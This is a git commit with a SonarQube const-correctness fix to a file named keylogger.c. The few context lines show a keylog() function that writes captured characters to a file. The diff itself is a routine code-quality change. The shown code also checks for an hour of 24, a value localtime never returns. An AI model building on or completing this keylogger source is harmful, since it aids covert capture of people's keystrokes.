851737ee9540f72115a85999863f352b0a57c1c5
Vidhi-TEST <test9.vidhi@gmail.com>
2024-12-12 10:21:16 +0530

    TTT-23 (bug) [SonarQube] Make the type of this variable a pointer-to-const. The current type of "tm_struct" is "struct tm *".

--- c/keylogger.c
+++ c/keylogger.c
@@ -13,7 +13,7 @@ int keylog()
         fprintf(fPtr, "%c", a);
     
     time_t now = time(NULL);
-    struct tm *tm_struct = localtime(&now);
+    const struct tm *tm_struct = localtime(&now);
     int hour = tm_struct->tm_hour;
     
     if(hour == 24)
